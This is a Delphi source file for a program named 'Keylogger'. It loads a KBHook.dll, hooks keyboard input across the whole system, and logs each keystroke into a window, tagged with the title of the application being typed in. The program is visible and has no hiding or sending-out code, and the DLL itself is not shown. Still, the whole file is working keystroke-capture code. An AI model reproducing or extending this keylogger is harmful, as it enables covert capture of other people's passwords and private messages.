program Keylogger;

uses
  windows, messages;

{$R resource.res}
{$INCLUDE AppTools.inc}

const

  IDC_BTNABOUT = 101;
  IDC_EDTLOGGER = 102;
  IDC_CHKALWAYSONTOP = 103;

  FontName = 'Tahoma';
  FontSize = -18;
  FontNameEdt = 'Courier New';
  FontSizeEdt = -12;

const

  APPNAME = 'Keylogger';
  VER = '1.0';
  INFO_TEXT = APPNAME + ' ' + VER + #13#10 +
    'Copyright © Your Nmae' + #13#10 +
    'https://github.com/' + #13#10#13#10 +
    'KBHookDLL 1.0' + #13#10 + 'Copyright © Your Name';

  IDC_STATUSBAR = 103;

var
  hApp: THandle;

  whitebrush: HBRUSH = 0;

  WhiteLB: TLogBrush =
  (
    lbStyle: BS_SOLID;
    lbColor: $00FFFFFF;
    lbHatch: 0
    );

type
  TFNCreateHook = function(hWnd: HWND; ShiftKeys: Boolean): Boolean; stdcall;
  TFNDeleteHook = function: Boolean; stdcall;
  TFNGetLastKey = function: Word; stdcall;

const
  WM_KEYBOARD_HOOK = WM_USER + 52012;
  KBHOOKDLL = 'KBHook.dll';

var
  hLib: THandle = 0;
  CreateHookFtn: TFNCreateHook = nil;
  DeleteHookFtn: TFNDeleteHook = nil;
  WndTitleOld: string = '';

function dlgfunc(hDlg: hWnd; uMsg: dword; wParam: wParam; lParam: lParam): bool;
  stdcall;
var
  MyFont: HFONT;
  s: string;
  TextLength: Integer;
  Buffer: PChar;
  EditText: string;
  WndTitle: array[0..255] of Char;

begin
  result := true;
  case uMsg of
    WM_INITDIALOG:
      begin
        hApp := hDlg;

        if SendMessage(hDlg, WM_SETICON, ICON_SMALL, Integer(LoadIcon(hInstance,
          MAKEINTRESOURCE(1)))) = 0 then
          SendMessage(hDlg, WM_SETICON, ICON_BIG, Integer(LoadIcon(hInstance,
            MAKEINTRESOURCE(1))));

        MyFont := CreateFont(FontSize, 0, 0, 0, 900, 0, 0, 0, ANSI_CHARSET,
          OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
          DEFAULT_PITCH, FontName);
        if MyFont <> 0 then
          SendDlgItemMessage(hDlg, 999, WM_SETFONT, Integer(MyFont),
            Integer(true));
        MyFont := CreateFont(FontSizeEdt, 0, 0, 0, 500, 0, 0, 0, ANSI_CHARSET,
          OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
          DEFAULT_PITCH, FontNameEdt);
        if MyFont <> 0 then
          SendDlgItemMessage(hDlg, IDC_EDTLOGGER, WM_SETFONT, Integer(MyFont),
            Integer(true));

        s := APPNAME + ' ' + VER;
        SetWindowText(hDlg, pointer(s));
        SetDlgItemText(hDlg, 999, pointer(s));

        CheckDlgButton(hDlg, IDC_CHKALWAYSONTOP, BST_CHECKED);
        SetWindowPos(hDlg, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE or SWP_NOMOVE);
        if not CreateHookFtn(hDlg, TRUE) then
          Messagebox(hDlg, '', '', 0);
      end;
    WM_CTLCOLORSTATIC:
      begin
        case GetDlgCtrlId(lParam) of
          999: { color the banner white }
            begin
              whitebrush := CreateBrushIndirect(WhiteLB);
              SetBkColor(wParam, WhiteLB.lbColor);
              result := BOOL(whitebrush);
            end;
          IDC_EDTLOGGER:
            begin
              whitebrush := CreateBrushIndirect(WhiteLB);
              SetBkColor(wParam, WhiteLB.lbColor);
              result := BOOL(whitebrush);
            end;
        else
          Result := False;
        end;
      end;
    WM_LBUTTONDOWN:
      begin
        SetCursor(LoadCursor(0, IDC_SIZEALL));
        SendMessage(hDlg, WM_NCLBUTTONDOWN, HTCAPTION, lParam);
      end;
    WM_SIZE:
      begin
        MoveWindow(GetDlgItem(hDlg, 999), 0, 0, loword(lParam), 75, TRUE);
        s := APPNAME + ' ' + VER;
        SetDlgItemText(hDlg, 999, pointer(s));
        SetWindowPos(GetDlgItem(hDlg, 101), GetDlgItem(hDlg, 999), loword(lParam)
          - 47, 7, 40, 22, 0);
        MoveWindow(GetDlgItem(hDlg, IDC_EDTLOGGER), 0, 100, LoWord(lParam),
          HiWord(lParam) - 100, TRUE);
      end;
    WM_CLOSE:
      begin
        DeleteHookFtn();
        EndDialog(hDlg, 0);
      end;
    WM_COMMAND:
      begin
      { accel for closing the dialog with ESC }
        if wParam = ID_CANCEL then
          SendMessage(hDlg, WM_CLOSE, 0, 0);
        if hiword(wParam) = BN_CLICKED then
        begin
          case LoWord(wParam) of
            IDC_BTNABOUT: MyMessageBox(hDlg, APPNAME, INFO_TEXT, 2);
            IDC_CHKALWAYSONTOP:
              begin
                if IsDlgButtonChecked(hDlg, IDC_CHKALWAYSONTOP) = BST_CHECKED
                  then
                  SetWindowPos(hDlg, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE or
                    SWP_NOMOVE)
                else
                  SetWindowPos(hDlg, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOSIZE or
                    SWP_NOMOVE)
              end;
          end;
        end;
      end;
    WM_KEYBOARD_HOOK:
      begin
        TextLength := SendDlgItemMessage(hDlg, IDC_EDTLOGGER, WM_GETTEXTLENGTH,
          0, 0);
        GetMem(Buffer, TextLength + 2);
        try
          SendDlgItemMessage(hDlg, IDC_EDTLOGGER, WM_GETTEXT, TextLength + 2,
            Integer(Buffer));
          case wParam of
            VK_RETURN: EditText := string(Buffer) + #13#10;
            VK_BACK:
              begin
                EditText := string(Buffer);
                Delete(EditText, length(EditText), 1);
              end;
            VK_CONTROL, VK_MENU, VK_SHIFT, VK_CAPITAL: EditText :=
              string(Buffer);
          else
            EditText := string(Buffer) + string(Chr(wParam));
          end;
          GetWindowText(lParam, @WndTitle, SizeOf(WndTitle));
          if WndTitleOld <> string(WndTitle) then
          begin
            Delete(EditText, length(EditText), 1);
            EditText := EditText + #13#10 + '[' + string(WndTitle) + ']' + #13#10
              + string(Chr(wParam));
            WndTitleOld := string(WndTitle);
          end;
          SendDlgItemMessage(hDlg, IDC_EDTLOGGER, WM_SETTEXT, 0,
            Integer(@EditText[1]));
        finally
          FreeMem(Buffer);
        end;
      end;
  else
    result := false;
  end;
end;

procedure GetEntryPoints(LibName: string);
begin
  hLib := LoadLibrary(@LibName[1]);
  if hLib <> 0 then
  begin
    @CreateHookFtn := GetProcAddress(hLib, 'CreateHook');
    @DeleteHookFtn := GetProcAddress(hLib, 'DeleteHook');
    if not (Assigned(CreateHookFtn) and Assigned(DeleteHookFtn)) then
    begin
      Messagebox(0, 'Funktionseinsprungspunkte konnten in ' + KBHOOKDLL +
        ' nichte gefunden werden.', 'LuckieSpy', MB_ICONERROR);
      Halt;
    end; // Assigned
  end
  else // LoadLibrary
  begin
    Messagebox(0, @(KBHOOKDLL + ' konnte nicht geladen werden. ')[1],
      'LuckieSpy', MB_ICONERROR);
    Halt;
  end; // LoadLibrary
end;

begin
  GetEntryPoints(KBHOOKDLL);
  DialogBox(hInstance, MAKEINTRESOURCE(100), 0, @dlgfunc);
  if hLib <> 0 then
    FreeLibrary(hLib);
end.

